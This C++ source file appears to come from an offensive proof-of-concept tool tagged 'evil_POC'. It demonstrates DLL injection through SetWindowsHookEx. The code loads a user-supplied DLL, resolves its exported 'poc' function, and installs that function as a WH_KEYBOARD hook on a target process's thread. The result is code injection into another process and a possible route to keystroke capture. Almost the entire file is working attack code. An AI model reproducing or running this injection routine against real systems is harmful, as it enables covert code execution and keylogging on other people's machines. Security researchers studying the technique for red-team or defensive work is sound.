#pragma once

#include "Hook.h"
#include "fProcess.h"


BOOL POC_Hook::demoSetWindowsHookEx(DWORD dwProcessId, PCWSTR strProcName, PCWSTR pszLibFile)
{
	OutputDebugString(TEXT("[evil_POC] demoSetWindowsHookEx -->"));

	BOOL bOK = FALSE;
	DWORD dwThreadId = POC_fProcess::getThreadID(dwProcessId);

	__try {
		if (dwThreadId == (DWORD)0)
		{
			OutputDebugString(TEXT("[evil_POC] demoSetWindowsHookEx --> Error: Cannot find thread"));
			wprintf(TEXT("[-] Error: Cannot find thread"));
			__leave;
		}

		wprintf(TEXT("[+] Using Thread ID %u\n"), dwThreadId);

		HMODULE dll = LoadLibraryEx(pszLibFile, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (dll == NULL)
		{
			OutputDebugString(TEXT("[evil_POC] demoSetWindowsHookEx --> Error: The DLL could not be found"));
			wprintf(TEXT("[-] Error: The DLL could not be found.\n"));
			__leave;
		}

		// Your DLL needs to export the 'poc' function
		HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "poc");
		if (addr == NULL)
		{
			OutputDebugString(TEXT("[evil_POC] demoSetWindowsHookEx --> Error: The DLL exported function was not found"));
			wprintf(TEXT("[-] Error: The DLL exported function was not found.\n"));
			__leave;
		}

		HWND targetWnd = FindWindow(NULL, strProcName);
		GetWindowThreadProcessId(targetWnd, &dwProcessId);

		HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, dwThreadId);
		if (handle == NULL)
		{
			OutputDebugString(TEXT("[evil_POC] demoSetWindowsHookEx --> Error: The KEYBOARD could not be hooked"));
			wprintf(TEXT("[-] Error: The KEYBOARD could not be hooked.\n"));
			__leave;
		}
		else
		{
			wprintf(TEXT("[+] Program successfully hooked.\nPress enter to unhook the function and stop the program.\n"));
			getchar();
			UnhookWindowsHookEx(handle);
			bOK = TRUE;
		}
	}
	__finally {
		//TODO Clean up
	}

	return(bOK);
}